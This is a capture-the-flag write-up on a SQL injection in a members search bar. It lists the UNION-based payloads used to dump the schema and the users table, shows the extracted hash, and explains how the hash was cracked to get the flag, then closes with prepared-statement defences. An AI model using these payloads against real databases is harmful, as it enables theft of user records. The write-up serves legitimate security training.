# Insecure search bar on the members page

## How do we find the breach ?

1. We begin to find SQL injection point with query :  `'` . There was possible to inject SQL queries in the search bar of members page, and we have got successfully the existing users list with "1 OR 1=1".    
2. We have then extracted database information with query : `7 OR UNION SELECT table_name, column_name FROM information_schema.columns`.
3. We are interested in users information especially, so we have extracted it with query : `1 OR 1=1 UNION SELECT concat(user_id, first_name, last_name, country, planet, commentaire, countersign),2 FROM users`
4. We got something interesting :
```text
ID: 1 OR 1=1 UNION SELECT concat(user_id, first_name, last_name, country, planet, commentaire, countersign),2 FROM users 
First name: 5FlagGetThe4242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Surname : 2
```
5. We decrypted 5ff9d0165b4f92b14994e5c685cdce28, and we got {"Plain":"FortyTwo","Algo":"md5"}
6. Then we encrypted `fortytwo` on Sh256, and we got the flag.

## How to exploit the breach ?

- SQL injection : inject malicious SQL code as user input to manipulate or get database information.

## How to avoid the breach ?

- Sanitize and validate user input.  
- Never concatenate user input into SQL queries.  
- Use SQL prepared statements, so that user input is treated strictly as data, not as part of the SQL query.
